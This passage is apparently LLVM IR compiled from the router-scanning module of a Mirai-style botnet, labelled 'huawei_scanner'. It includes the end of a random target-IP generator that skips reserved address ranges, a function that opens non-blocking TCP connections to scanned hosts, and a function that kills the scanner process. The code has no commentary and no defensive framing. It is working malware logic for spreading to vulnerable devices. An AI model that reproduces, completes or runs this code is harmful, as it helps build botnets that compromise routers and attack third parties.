111:                                              ; preds = %107
  %112 = load i8, i8* %3, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 6
  br i1 %114, label %163, label %115

115:                                              ; preds = %111
  %116 = load i8, i8* %3, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 7
  br i1 %118, label %163, label %119

119:                                              ; preds = %115
  %120 = load i8, i8* %3, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 11
  br i1 %122, label %163, label %123

123:                                              ; preds = %119
  %124 = load i8, i8* %3, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 %125, 21
  br i1 %126, label %163, label %127

127:                                              ; preds = %123
  %128 = load i8, i8* %3, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 22
  br i1 %130, label %163, label %131

131:                                              ; preds = %127
  %132 = load i8, i8* %3, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 26
  br i1 %134, label %163, label %135

135:                                              ; preds = %131
  %136 = load i8, i8* %3, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 28
  br i1 %138, label %163, label %139

139:                                              ; preds = %135
  %140 = load i8, i8* %3, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 29
  br i1 %142, label %163, label %143

143:                                              ; preds = %139
  %144 = load i8, i8* %3, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 30
  br i1 %146, label %163, label %147

147:                                              ; preds = %143
  %148 = load i8, i8* %3, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 33
  br i1 %150, label %163, label %151

151:                                              ; preds = %147
  %152 = load i8, i8* %3, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 55
  br i1 %154, label %163, label %155

155:                                              ; preds = %151
  %156 = load i8, i8* %3, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp eq i32 %157, 214
  br i1 %158, label %163, label %159

159:                                              ; preds = %155
  %160 = load i8, i8* %3, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 215
  br label %163

163:                                              ; preds = %159, %155, %151, %147, %143, %139, %135, %131, %127, %123, %119, %115, %111
  %164 = phi i1 [ true, %155 ], [ true, %151 ], [ true, %147 ], [ true, %143 ], [ true, %139 ], [ true, %135 ], [ true, %131 ], [ true, %127 ], [ true, %123 ], [ true, %119 ], [ true, %115 ], [ true, %111 ], [ %162, %159 ]
  br label %165

165:                                              ; preds = %163, %107, %103, %91, %83, %71, %59, %51, %47, %43, %39, %35, %31, %27
  %166 = phi i1 [ true, %107 ], [ true, %103 ], [ true, %91 ], [ true, %83 ], [ true, %71 ], [ true, %59 ], [ true, %51 ], [ true, %47 ], [ true, %43 ], [ true, %39 ], [ true, %35 ], [ true, %31 ], [ true, %27 ], [ %164, %163 ]
  br i1 %166, label %8, label %167, !llvm.loop !16

167:                                              ; preds = %165
  %168 = call i32 @rand() #7
  %169 = srem i32 %168, 3
  store i32 %169, i32* %7, align 4
  %170 = load i32, i32* %7, align 4
  %171 = icmp eq i32 %170, 0
  br i1 %171, label %172, label %186

172:                                              ; preds = %167
  %173 = load i8, i8* %4, align 1
  %174 = zext i8 %173 to i32
  %175 = shl i32 %174, 16
  %176 = or i32 -1677721600, %175
  %177 = load i8, i8* %5, align 1
  %178 = zext i8 %177 to i32
  %179 = shl i32 %178, 8
  %180 = or i32 %176, %179
  %181 = load i8, i8* %6, align 1
  %182 = zext i8 %181 to i32
  %183 = shl i32 %182, 0
  %184 = or i32 %180, %183
  %185 = call i32 @htonl(i32 %184) #9
  store i32 %185, i32* %1, align 4
  br label %240

186:                                              ; preds = %167
  %187 = load i32, i32* %7, align 4
  %188 = icmp eq i32 %187, 1
  br i1 %188, label %189, label %203

189:                                              ; preds = %186
  %190 = load i8, i8* %4, align 1
  %191 = zext i8 %190 to i32
  %192 = shl i32 %191, 16
  %193 = or i32 -989855744, %192
  %194 = load i8, i8* %5, align 1
  %195 = zext i8 %194 to i32
  %196 = shl i32 %195, 8
  %197 = or i32 %193, %196
  %198 = load i8, i8* %6, align 1
  %199 = zext i8 %198 to i32
  %200 = shl i32 %199, 0
  %201 = or i32 %197, %200
  %202 = call i32 @htonl(i32 %201) #9
  store i32 %202, i32* %1, align 4
  br label %240

203:                                              ; preds = %186
  %204 = load i32, i32* %7, align 4
  %205 = icmp eq i32 %204, 2
  br i1 %205, label %206, label %220

206:                                              ; preds = %203
  %207 = load i8, i8* %4, align 1
  %208 = zext i8 %207 to i32
  %209 = shl i32 %208, 16
  %210 = or i32 687865856, %209
  %211 = load i8, i8* %5, align 1
  %212 = zext i8 %211 to i32
  %213 = shl i32 %212, 8
  %214 = or i32 %210, %213
  %215 = load i8, i8* %6, align 1
  %216 = zext i8 %215 to i32
  %217 = shl i32 %216, 0
  %218 = or i32 %214, %217
  %219 = call i32 @htonl(i32 %218) #9
  store i32 %219, i32* %1, align 4
  br label %240

220:                                              ; preds = %203
  %221 = load i32, i32* %7, align 4
  %222 = icmp eq i32 %221, 3
  br i1 %222, label %223, label %240

223:                                              ; preds = %220
  %224 = load i8, i8* %3, align 1
  %225 = zext i8 %224 to i32
  %226 = shl i32 %225, 24
  %227 = load i8, i8* %4, align 1
  %228 = zext i8 %227 to i32
  %229 = shl i32 %228, 16
  %230 = or i32 %226, %229
  %231 = load i8, i8* %5, align 1
  %232 = zext i8 %231 to i32
  %233 = shl i32 %232, 8
  %234 = or i32 %230, %233
  %235 = load i8, i8* %6, align 1
  %236 = zext i8 %235 to i32
  %237 = shl i32 %236, 0
  %238 = or i32 %234, %237
  %239 = call i32 @htonl(i32 %238) #9
  store i32 %239, i32* %1, align 4
  br label %240

240:                                              ; preds = %172, %189, %206, %223, %220
  %241 = load i32, i32* %1, align 4
  ret i32 %241
}

declare zeroext i16 @checksum_generic(i16*, i32) #1

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #1

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #4

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32) #4

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32) #4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @huawei_setup_connection(%struct.huawei_scanner_connection* %0) #0 {
  %2 = alloca %struct.huawei_scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.huawei_scanner_connection* %0, %struct.huawei_scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %5, i8 0, i64 16, i1 false)
  %6 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %6, i32 0, i32 0
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %15

10:                                               ; preds = %1
  %11 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %11, i32 0, i32 0
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 %13)
  br label %15

15:                                               ; preds = %10, %1
  %16 = call i32 @socket(i32 2, i32 1, i32 0) #7
  %17 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %2, align 8
  %18 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 8
  %19 = icmp eq i32 %16, -1
  br i1 %19, label %20, label %21

20:                                               ; preds = %15
  br label %71

21:                                               ; preds = %15
  %22 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %2, align 8
  %23 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %22, i32 0, i32 5
  store i32 0, i32* %23, align 4
  %24 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %24, i32 0, i32 6
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i64 0, i64 0
  call void @util_zero(i8* %26, i32 256)
  %27 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %2, align 8
  %28 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %27, i32 0, i32 0
  %29 = load i32, i32* %28, align 8
  %30 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 8
  %33 = call i32 (i32, i32, ...) @fcntl(i32 %32, i32 3, i32 0)
  %34 = or i32 2048, %33
  %35 = call i32 (i32, i32, ...) @fcntl(i32 %29, i32 4, i32 %34)
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %2, align 8
  %38 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %37, i32 0, i32 3
  %39 = load i32, i32* %38, align 4
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %41 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %40, i32 0, i32 0
  store i32 %39, i32* %41, align 4
  %42 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %2, align 8
  %43 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %42, i32 0, i32 4
  %44 = load i16, i16* %43, align 8
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  %46 = load i32, i32* @huawei_fake_time, align 4
  %47 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %2, align 8
  %48 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %47, i32 0, i32 1
  store i32 %46, i32* %48, align 4
  %49 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %2, align 8
  %50 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %49, i32 0, i32 2
  %51 = load i32, i32* %50, align 8
  %52 = icmp eq i32 %51, 3
  br i1 %52, label %58, label %53

53:                                               ; preds = %21
  %54 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %2, align 8
  %55 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %54, i32 0, i32 2
  %56 = load i32, i32* %55, align 8
  %57 = icmp eq i32 %56, 4
  br i1 %57, label %58, label %59

58:                                               ; preds = %53, %21
  br label %62

59:                                               ; preds = %53
  %60 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %2, align 8
  %61 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %60, i32 0, i32 2
  store i32 1, i32* %61, align 8
  br label %62

62:                                               ; preds = %59, %58
  %63 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %2, align 8
  %64 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %63, i32 0, i32 0
  %65 = load i32, i32* %64, align 8
  %66 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %67 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %67, %struct.sockaddr** %66, align 8
  %68 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %69 = load %struct.sockaddr*, %struct.sockaddr** %68, align 8
  %70 = call i32 @connect(i32 %65, %struct.sockaddr* %69, i32 16)
  br label %71

71:                                               ; preds = %62, %20
  ret void
}

declare void @util_zero(i8*, i32) #1

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #1

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #2

declare i32 @util_strcpy(i8*, i8*) #1

declare i64 @send(i32, i8*, i64, i32) #1

declare i32 @util_strlen(i8*) #1

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i1 immarg) #6

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @huawei_kill() #0 {
  %1 = load i32, i32* @huawei_scanner_pid, align 4
  %2 = call i32 @kill(i32 %1, i32 9) #7
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare void @srand(i32) #2

; Function Attrs: nounwind
declare i32 @rand() #2

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { argmemonly nofree nounwind willreturn writeonly }
attributes #6 = { argmemonly nofree nounwind willreturn }
attributes #7 = { nounwind }
attributes #8 = { noreturn nounwind }
attributes #9 = { nounwind readnone willreturn }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}